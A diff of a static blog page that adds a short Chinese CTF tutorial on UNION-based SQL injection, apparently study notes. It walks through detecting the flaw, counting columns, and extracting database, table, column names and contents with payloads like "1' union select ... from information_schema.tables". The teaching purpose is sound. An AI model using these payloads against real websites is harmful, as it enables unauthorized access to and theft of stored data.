@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>categories |  CTF</title>
+      <title>union联合注入 |  CTF</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -55,12 +55,203 @@
       
     <main class="content on">
       <section class="outer">
+  <article
+  id="post-union联合注入"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  union联合注入
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" class="article-date">
+  <time datetime="2023-02-02T08:51:22.000Z" itemprop="datePublished">2023-02-02</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Web/">Web</a> / <a class="article-category-link" href="/categories/Web/Sql/">Sql</a>
+  </div>
   
-    <h1 class="page-type-title">分类</h1>
-    <div class="categories-box">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web/Sql/">Sql</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/md5%E7%BB%95%E8%BF%87/">md5绕过</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">变量覆盖</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">28</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/AES/">AES</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/ECC/">ECC</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/RSA/">RSA</a><span class="category-list-count">23</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">3</span></li></ul>
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">481</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">1 分钟</span>
+        </span>
+    </span>
+</div>
+ 
     </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
   
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h3 id="1-判断是否存在漏洞"><a href="#1-判断是否存在漏洞" class="headerlink" title="1.判断是否存在漏洞"></a>1.判断是否存在漏洞</h3><p>用单引号或者双引号判断是否报错。若报错则存在sql注入漏洞</p>
+<h3 id="2-判断是字符型的还是数字型漏洞"><a href="#2-判断是字符型的还是数字型漏洞" class="headerlink" title="2.判断是字符型的还是数字型漏洞"></a>2.判断是字符型的还是数字型漏洞</h3><p>输入    </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=2#</span></span><br></pre></td></tr></table></figure>
+
+<p>如果与原来只输入  1   的结果相同则是数字</p>
+<h3 id="3-判断select几列"><a href="#3-判断select几列" class="headerlink" title="3.判断select几列"></a>3.判断select几列</h3><p>用  order  by</p>
+<p>如果order by  被过滤了可以用group by</p>
+<h3 id="4-获取数据库名"><a href="#4-获取数据库名" class="headerlink" title="4.获取数据库名"></a>4.获取数据库名</h3><p>假设这里select的是3列  然后需要自己在判断一下哪几位是回显位  然后用联合注入查询 数据库</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,database()#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-获取数据库表名"><a href="#5-获取数据库表名" class="headerlink" title="5.获取数据库表名"></a>5.获取数据库表名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表， 表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际 上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</span><br><span class="line">SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases的结果 取之此表。</span><br><span class="line">TABLES表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个</span><br><span class="line">schema，表类型，表引擎，创建时间等信息。是show tables from schemaname的 结果取之此表。</span><br><span class="line">COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。是</span><br><span class="line">show columns from schemaname.tablename的结果取之此表。</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-获取表中的字段名"><a href="#6-获取表中的字段名" class="headerlink" title="6.获取表中的字段名"></a>6.获取表中的字段名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;&#x27; and table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="7-查询字段中的内容"><a href="#7-查询字段中的内容" class="headerlink" title="7.查询字段中的内容"></a>7.查询字段中的内容</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select group_concat(, , ) from biaoming#</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>group_concat()  函数是让多行数据在一行显示   如果被过滤  可以利用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit 0,1;</span><br></pre></td></tr></table></figure>
+
+
+
+ 
+      <!-- reward -->
+      
+      <div id="reword-out">
+        <div id="reward-btn">
+          打赏
+        </div>
+      </div>
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2023/02/02/union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/union%E8%81%94%E5%90%88/" rel="tag">union联合</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2023/02/02/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            堆叠注入
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2023/02/02/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">绕过技巧</div>
+      </a>
+    
+  </nav>
+
+  
+   
+  
+   
+    <script src="https://cdn.staticfile.org/twikoo/1.4.18/twikoo.all.min.js"></script>
+    <div id="twikoo" class="twikoo"></div>
+    <script>
+        twikoo.init({
+            envId: ""
+        })
+    </script>
+ 
+</article>
+
 </section>
       <footer class="footer">
   <div class="outer">
@@ -192,6 +383,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
 <link
